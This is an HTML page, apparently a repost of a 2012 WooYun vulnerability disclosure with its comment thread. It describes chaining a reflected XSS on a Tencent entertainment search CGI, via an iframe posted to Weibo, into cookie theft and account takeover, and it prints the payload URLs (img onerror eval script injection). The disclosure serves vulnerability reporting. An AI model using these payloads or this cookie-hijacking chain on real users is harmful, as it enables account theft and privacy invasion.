@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷）  - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Jannock" /><meta name="description" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） 。跨站脚本-可以让战场离得更远，战争更加隐蔽。。。反射型XSS漏洞不严重？有兴趣看完这篇，自己来评价吧。。。所有事件由一个反射型XSS开始。先说说过程：1、找个正规的站点，加入脚本代码（当然这个站是你可以控制的了，如自己的博客，正规大站的存储型跨站什么的。这样的情况应该很多，而且别人也不会在意。这脚本实际就是一个 iframe ，然后链接是反射型的xss，当然还带有自己的盗取cookie的脚本代码。2、在腾讯微博发一下简单的微博，带有上述外部正规站的链接（实战中可以加些更吸引的）" />
+<meta name="keywords" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/3164/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " />
+<meta property="og:description" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） 。跨站脚本-可以让战场离得更远，战争更加隐蔽。。。反射型XSS漏洞不严重？有兴趣看完这篇，自己来评价吧。。。所有事件由一个反射型XSS开始。先说说过程：1、找个正规的站点，加入脚本代码（当然这个站是你可以控制的了，如自己的博客，正规大站的存储型跨站什么的。这样的情况应该很多，而且别人也不会在意。这脚本实际就是一个 iframe ，然后链接是反射型的xss，当然还带有自己的盗取cookie的脚本代码。2、在腾讯微博发一下简单的微博，带有上述外部正规站的链接（实战中可以加些更吸引的）" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/3164/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2012-12-17T19:10:16&#43;08:00" />
+<meta property="article:modified_time" content="2012-12-17T19:10:16&#43;08:00" />
+
+<meta itemprop="name" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） ">
+<meta itemprop="description" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） 。跨站脚本-可以让战场离得更远，战争更加隐蔽。。。反射型XSS漏洞不严重？有兴趣看完这篇，自己来评价吧。。。所有事件由一个反射型XSS开始。先说说过程：1、找个正规的站点，加入脚本代码（当然这个站是你可以控制的了，如自己的博客，正规大站的存储型跨站什么的。这样的情况应该很多，而且别人也不会在意。这脚本实际就是一个 iframe ，然后链接是反射型的xss，当然还带有自己的盗取cookie的脚本代码。2、在腾讯微博发一下简单的微博，带有上述外部正规站的链接（实战中可以加些更吸引的）"><meta itemprop="datePublished" content="2012-12-17T19:10:16&#43;08:00" />
+<meta itemprop="dateModified" content="2012-12-17T19:10:16&#43;08:00" />
+<meta itemprop="wordCount" content="4410">
+<meta itemprop="keywords" content="脚本,跨站,腾讯,CGI,cookie,HTTP,IE,IP,QQ,XSS,安全,测试,代码,工具,技术,浏览器,漏洞,网络,网络安全,微博,问题,乌云,云," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） "/>
+<meta name="twitter:description" content="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） 。跨站脚本-可以让战场离得更远，战争更加隐蔽。。。反射型XSS漏洞不严重？有兴趣看完这篇，自己来评价吧。。。所有事件由一个反射型XSS开始。先说说过程：1、找个正规的站点，加入脚本代码（当然这个站是你可以控制的了，如自己的博客，正规大站的存储型跨站什么的。这样的情况应该很多，而且别人也不会在意。这脚本实际就是一个 iframe ，然后链接是反射型的xss，当然还带有自己的盗取cookie的脚本代码。2、在腾讯微博发一下简单的微博，带有上述外部正规站的链接（实战中可以加些更吸引的）"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） </h1>
+      
+      <div class="post-meta">
+        <time datetime="2012-12-17" class="post-time">
+          2012-12-17
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E8%84%9A%E6%9C%AC/"> 脚本 </a>
+            <a href="https://lcx.cc/categories/%E8%B7%A8%E7%AB%99/"> 跨站 </a>
+            <a href="https://lcx.cc/categories/%E8%85%BE%E8%AE%AF/"> 腾讯 </a>
+            
+          </div>
+        <span class="more-meta"> 约 4410 字 </span>
+          <span class="more-meta"> 预计阅读 9 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<p style="text-indent:2em;">
+	漏洞详情
+</p>
+<p>
+	<strong>披露状态：</strong><strong>&nbsp;&nbsp;</strong> 
+</p>
+<p style="text-indent:2em;">
+	2012-08-22：	细节已通知厂商并且等待厂商处理中
+</p>
+<p style="text-indent:2em;">
+	2012-08-23：	厂商已经确认，细节仅向厂商公开
+</p>
+<p style="text-indent:2em;">
+	2012-09-02：	细节向核心白帽子及相关领域专家公开
+</p>
+<p style="text-indent:2em;">
+	2012-09-12：	细节向普通白帽子公开
+</p>
+<p style="text-indent:2em;">
+	2012-09-22：	细节向实习白帽子公开
+</p>
+<p style="text-indent:2em;">
+	2012-10-07：	细节向公众公开
+</p>
+<p>
+	<strong>简要描述：</strong> 
+</p>
+<p style="text-indent:2em;">
+	跨站脚本-可以让战场离得更远，战争更加隐蔽。。。
+</p>
+<p style="text-indent:2em;">
+	反射型XSS漏洞不严重？有兴趣看完这篇，自己来评价吧。。。
+</p>
+<p>
+	<strong>详细说明：</strong> 
+</p>
+<p style="text-indent:2em;">
+	所有事件由一个反射型XSS开始。
+</p>
+<p style="text-indent:2em;">
+	先说说过程：
+</p>
+<p style="text-indent:2em;">
+	1、找个正规的站点，加入脚本代码（当然这个站是你可以控制的了，如自己的博客，正规大站的存储型跨站什么的。这样的情况应该很多，而且别人也不会在意。
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/1669_1.jpg" target="_blank"><img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1669_1.jpg" width="780" height="301" /></a> 
+</p>
+<p style="text-indent:2em;">
+	这脚本实际就是一个 iframe ，然后链接是反射型的xss，当然还带有自己的盗取cookie的脚本代码。
+</p>
+<p style="text-indent:2em;">
+	2、在腾讯微博发一下简单的微博，带有上述外部正规站的链接（实战中可以加些更吸引的）
+</p>
+<p style="text-indent:2em;">
+	<img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1670_2.jpg" width="605" height="74" /> 
+</p>
+<p style="text-indent:2em;">
+	3、过几分钟后，效果来了。。。看图
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/1671_3.jpg" target="_blank"><img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1671_3.jpg" width="780" height="391" /></a> 
+</p>
+<p style="text-indent:2em;">
+	4、cookie欺骗
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/1672_4.jpg" target="_blank"><img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1672_4.jpg" width="780" height="543" /></a> 
+</p>
+<p style="text-indent:2em;">
+	<a href="/file/old/1673_5.jpg" target="_blank"><img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1673_5.jpg" width="780" height="603" /></a> 
+</p>
+<p style="text-indent:2em;">
+	可以看出，可以发微博，看邮箱，还有很多可以做。。。大家自由发挥。。。
+</p>
+<p style="text-indent:2em;">
+	如获取好友列表
+</p>
+<p style="text-indent:2em;">
+	http://pay.qq.com/cgi-bin/personal/get_user_friends.cgi
+</p>
+<p style="text-indent:2em;">
+	<img title="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " alt="跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷） " src="/file/old/1674_6.jpg" width="682" height="129" /> 
+</p>
+<p style="text-indent:2em;">
+	首先，公布下存在xss的地方
+</p>
+<p style="text-indent:2em;">
+	http://datalib.ent.qq.com/cgi-bin/search_ent?keyvalue=\u003cimg%20src=%23%20onerror=eval%28/document.write('\u003cscript src=aaa\u003e\u003c/script\u003e')/.source%29%20/\u003e
+</p>
+<p style="text-indent:2em;">
+	http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;attr=133&amp;tname=star_second.shtml&amp;keyvalue=\u003cimg%20src=%23\u0020onerror=eval....
+</p>
+<p style="text-indent:2em;">
+	存在的问题：
+</p>
+<p style="text-indent:2em;">
+	1、没有使用httponly
+</p>
+<p style="text-indent:2em;">
+	2、身份验证太单一。
+</p>
+<p style="text-indent:2em;">
+	这样的跨站十分隐蔽，一般极难发现。看到这个案例，你还敢乱点微博中邮箱中的链接么？
+</p>
+<p>
+	<strong>漏洞证明：</strong> 
+</p>
+<p style="text-indent:2em;">
+	可以问问 zeracker
+</p>
+<p>
+	<strong>修复方案：</strong> 
+</p>
+<p style="text-indent:2em;">
+	1、没有使用httponly
+</p>
+<p style="text-indent:2em;">
+	2、身份验证太单一。
+</p>
+<p>
+	<strong>白帽子讨论：</strong> 
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:19 | neal ( 普通白帽子 | Rank:82 漏洞数:9 | "&gt;&lt;"\')
+</p>
+<p style="text-indent:2em;">
+	求忽略,求公开.
+</p>
+<p style="text-indent:2em;">
+	1#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:31 | Henry:bobo ( 普通白帽子 | Rank:104 漏洞数:22 | 本胖吊！~又高又肥2个奶奶像地雷)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 的文章是精品 求忽略 腾讯忽略咯啊
+</p>
+<p style="text-indent:2em;">
+	2#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:40 | Jannock (核心白帽子 | Rank:1180 漏洞数:102 | 关注技术与网络安全)
+</p>
+<p style="text-indent:2em;">
+	编辑漏洞 乌云可以编辑漏洞了。。。
+</p>
+<p style="text-indent:2em;">
+	3#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:41 | Henry:bobo ( 普通白帽子 | Rank:104 漏洞数:22 | 本胖吊！~又高又肥2个奶奶像地雷)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 恭喜你看到了！
+</p>
+<p style="text-indent:2em;">
+	4#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:42 | gainover (核心白帽子 | Rank:961 漏洞数:48 | PKAV技术宅社区! -- gainover| 工具猫网络-...)
+</p>
+<p style="text-indent:2em;">
+	乌云一下又火起来啦～
+</p>
+<p style="text-indent:2em;">
+	5#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:43 | Henry:bobo ( 普通白帽子 | Rank:104 漏洞数:22 | 本胖吊！~又高又肥2个奶奶像地雷)
+</p>
+<p style="text-indent:2em;">
+	乌云一下又火起来啦～
+</p>
+<p style="text-indent:2em;">
+	6#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:47 | m4trix1 ( 实习白帽子 | Rank:10 漏洞数:2 | 绝对有jj)
+</p>
+<p style="text-indent:2em;">
+	这得要哪个年头才能看到
+</p>
+<p style="text-indent:2em;">
+	7#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:49 | zeracker ( 普通白帽子 | Rank:891 漏洞数:119 | 哥，怒了！)
+</p>
+<p style="text-indent:2em;">
+	我知道带头大哥是在做神马了。我是第一个受害者。/抓狂。。 /抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、
+</p>
+<p style="text-indent:2em;">
+	8#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 22:50 | zeracker ( 普通白帽子 | Rank:891 漏洞数:119 | 哥，怒了！)
+</p>
+<p style="text-indent:2em;">
+	前段时间就劫持了我的企鹅号码。/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、/抓狂、
+</p>
+<p style="text-indent:2em;">
+	9#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 23:01 | 情深( 实习白帽子 | Rank:12 漏洞数:4 | 安全小白)
+</p>
+<p style="text-indent:2em;">
+	求公开啊
+</p>
+<p style="text-indent:2em;">
+	10#
+</p>
+<p style="text-indent:2em;">
+	2012-08-22 23:56 | goderci ( 普通白帽子 | Rank:325 漏洞数:29 | http://www.yunday.org)
+</p>
+<p style="text-indent:2em;">
+	膜拜神牛
+</p>
+<p style="text-indent:2em;">
+	11#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 01:07 | se55i0n ( 普通白帽子 | Rank:523 漏洞数:74 | 世界末日要来了，各种求礼物呀~~)
+</p>
+<p style="text-indent:2em;">
+	求腾讯忽略公开~_~
+</p>
+<p style="text-indent:2em;">
+	12#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 08:53 | 大和尚( 普通白帽子 | Rank:39 漏洞数:4 | www.ieroot.com 积极向上的心态！百折不挠...)
+</p>
+<p style="text-indent:2em;">
+	又见大牛！！！ 关注关注关注！ 求公开求讲解
+</p>
+<p style="text-indent:2em;">
+	13#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 09:11 | zidane ( 实习白帽子 | Rank:13 漏洞数:2 | 噢 乖，你们应该明白 这样下去对我们谁都不...)
+</p>
+<p style="text-indent:2em;">
+	求分享 求妹纸
+</p>
+<p style="text-indent:2em;">
+	14#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 09:44 | 瘦蛟舞( 普通白帽子 | Rank:274 漏洞数:27 | http://www.yunday.org)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 编辑漏洞在哪里=-=~，新发的才行？
+</p>
+<p style="text-indent:2em;">
+	15#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 09:58 | Jannock (核心白帽子 | Rank:1180 漏洞数:102 | 关注技术与网络安全)
+</p>
+<p style="text-indent:2em;">
+	@瘦蛟舞 厂商没确认的才可以编辑
+</p>
+<p style="text-indent:2em;">
+	16#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 10:00 | 瘦蛟舞( 普通白帽子 | Rank:274 漏洞数:27 | http://www.yunday.org)
+</p>
+<p style="text-indent:2em;">
+	@Jannock 袄，知道了，谢谢~~~~~·
+</p>
+<p style="text-indent:2em;">
+	17#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 10:54 | xsser (核心白帽子 | Rank:249 漏洞数:17 | 极为缓慢，沉重，凝滞的前行)
+</p>
+<p style="text-indent:2em;">
+	这个漏洞我不信腾讯能补，还是多发几个公仔吧
+</p>
+<p style="text-indent:2em;">
+	18#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 10:56 | gainover (核心白帽子 | Rank:961 漏洞数:48 | PKAV技术宅社区! -- gainover| 工具猫网络-...)
+</p>
+<p style="text-indent:2em;">
+	@xsser = = 难道是指的，一个站点的xss，就可以得到cookies，从而影响到很遥远的业务？
+</p>
+<p style="text-indent:2em;">
+	19#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 11:01 | xsser (核心白帽子 | Rank:249 漏洞数:17 | 极为缓慢，沉重，凝滞的前行)
+</p>
+<p style="text-indent:2em;">
+	@gainover 嘿嘿
+</p>
+<p style="text-indent:2em;">
+	20#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 13:45 | Max ( 普通白帽子 | Rank:45 漏洞数:7 | 每天都对自己说：一定要对自己好 一定要活...)
+</p>
+<p style="text-indent:2em;">
+	mark
+</p>
+<p style="text-indent:2em;">
+	21#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 16:59 | px1624 ( 普通白帽子 | Rank:55 漏洞数:7 | 电脑业余爱好者，菜鸟一个，是来交流学习的...)
+</p>
+<p style="text-indent:2em;">
+	@Max mark啥意思？
+</p>
+<p style="text-indent:2em;">
+	22#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 17:08 | gainover (核心白帽子 | Rank:961 漏洞数:48 | PKAV技术宅社区! -- gainover| 工具猫网络-...)
+</p>
+<p style="text-indent:2em;">
+	@px1624 大学英语不好好学～～ mark 就是做个记号呗，以便下次来看的意思。
+</p>
+<p style="text-indent:2em;">
+	23#
+</p>
+<p style="text-indent:2em;">
+	2012-08-23 18:21 | horseluke ( 普通白帽子 | Rank:84 漏洞数:14 | Realize the dream in earnest.)
+</p>
+<p style="text-indent:2em;">
+	@xsser 的意思好邪恶啊...我在遥远的地方等你来 -_-||
+</p>
+<p style="text-indent:2em;">
+	24#
+</p>
+<p style="text-indent:2em;">
+	2012-08-24 14:08 | 啤酒( 普通白帽子 | Rank:62 漏洞数:8 | 道不同.喝酒结盟)
+</p>
+<p style="text-indent:2em;">
+	腾讯要是能补掉这些大家心照不宣的前期构架缺陷.就相当于把腾讯所有业务逻辑都全部重新做一遍.客户端的.web端的.
+</p>
+<p style="text-indent:2em;">
+	25#
+</p>
+<p style="text-indent:2em;">
+	2012-08-24 14:18 | px1624 ( 普通白帽子 | Rank:55 漏洞数:7 | 电脑业余爱好者，菜鸟一个，是来交流学习的...)
+</p>
+<p style="text-indent:2em;">
+	@gainover 哦，我知道mark是记号、书签的意思，还真是直接mark、、、-————唉
+</p>
+<p style="text-indent:2em;">
+	26#
+</p>
+<p style="text-indent:2em;">
+	2012-09-04 22:48 | seclab_zju ( 普通白帽子 | Rank:78 漏洞数:11 | 浙江大学 网络安全)
+</p>
+<p style="text-indent:2em;">
+	这么看来反射型xss也可以形成蠕虫哦。不断的在微博上传播就可以了。
+</p>
+<p style="text-indent:2em;">
+	27#
+</p>
+<p style="text-indent:2em;">
+	2012-09-05 08:46 | 一刀终情( 普通白帽子 | Rank:138 漏洞数:25 | ??PKAV技术宅社区-安全爱好者)
+</p>
+<p style="text-indent:2em;">
+	会不会促使所有大站httponly呢……那xss还有明天么……
+</p>
+<p style="text-indent:2em;">
+	28#
+</p>
+<p style="text-indent:2em;">
+	2012-09-05 11:22 | gainover (核心白帽子 | Rank:961 漏洞数:48 | PKAV技术宅社区! -- gainover| 工具猫网络-...)
+</p>
+<p style="text-indent:2em;">
+	@一刀终情 不是他们不想 http-only，现在他们业务线这么长，腾讯很多地方，程序员都是从 document.cookie里读取skey来使用的，一旦http-only的话，很多程序都要修改。 鉴于成本和可能出现的难以预料的问题，他们是不敢去更改的！！
+</p>
+<p style="text-indent:2em;">
+	29#
+</p>
+<p style="text-indent:2em;">
+	2012-09-05 12:15 | 一刀终情( 普通白帽子 | Rank:138 漏洞数:25 | ??PKAV技术宅社区-安全爱好者)
+</p>
+<p style="text-indent:2em;">
+	@gainover 那这个他们真心没法补了，只能到处堵了……
+</p>
+<p style="text-indent:2em;">
+	30#
+</p>
+<p style="text-indent:2em;">
+	2012-09-05 18:36 | Henry:bobo ( 普通白帽子 | Rank:104 漏洞数:22 | 本胖吊！~又高又肥2个奶奶像地雷)
+</p>
+<p style="text-indent:2em;">
+	提醒：目前漏洞有限制开放中，你的 Rank 级别不够 ( 可以等待进一步公开或者支付 5 个乌云币提前查看
+</p>
+<p style="text-indent:2em;">
+	31#
+</p>
+<p style="text-indent:2em;">
+	2012-09-05 19:54 | 一刀终情( 普通白帽子 | Rank:138 漏洞数:25 | ??PKAV技术宅社区-安全爱好者)
+</p>
+<p style="text-indent:2em;">
+	@Henry:bobo 5个WB而已，值得
+</p>
+<p style="text-indent:2em;">
+	32#
+</p>
+<p style="text-indent:2em;">
+	2012-09-26 09:47 | zzR ( 普通白帽子 | Rank:374 漏洞数:37 | 我所期待的仅仅是那突如其来的出乎意料)
+</p>
+<p style="text-indent:2em;">
+	貌似在J 神测试的时候，俺还点击了那个微博-0-，好怕怕
+</p>
+<p style="text-indent:2em;">
+	33#
+</p>
+<p style="text-indent:2em;">
+	2012-09-26 09:57 | 蟋蟀哥哥( 普通白帽子 | Rank:329 漏洞数:52 | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)
+</p>
+<p style="text-indent:2em;">
+	。。。。原来还可以这么用。。还好藏了一个qq.com的xss。。空了去玩玩
+</p>
+<p style="text-indent:2em;">
+	34#
+</p>
+<p style="text-indent:2em;">
+	2012-10-07 08:53 | Night ( 普通白帽子 | Rank:50 漏洞数:12 | 中国社工联盟站长)
+</p>
+<p style="text-indent:2em;">
+	木有腾讯的XSS肿么办
+</p>
+<p style="text-indent:2em;">
+	35#
+</p>
+<p style="text-indent:2em;">
+	2012-10-07 13:43 | 情深( 实习白帽子 | Rank:12 漏洞数:4 | 安全小白)
+</p>
+<p style="text-indent:2em;">
+	牛逼 啊，这么利用反射型xss不错
+</p>
+<p style="text-indent:2em;">
+	36#
+</p>
+<p style="text-indent:2em;">
